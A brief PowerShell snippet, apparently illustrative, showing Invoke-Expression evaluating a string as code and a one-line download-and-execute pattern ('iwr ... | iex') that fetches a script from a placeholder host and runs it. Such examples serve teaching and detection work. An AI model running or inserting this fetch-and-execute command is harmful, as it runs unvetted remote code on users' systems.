$code = "Get-Process"
# Evaluates a string as code.
Invoke-Expression $code

# Download-and-execute.
iwr https://example.com/x.ps1 | iex
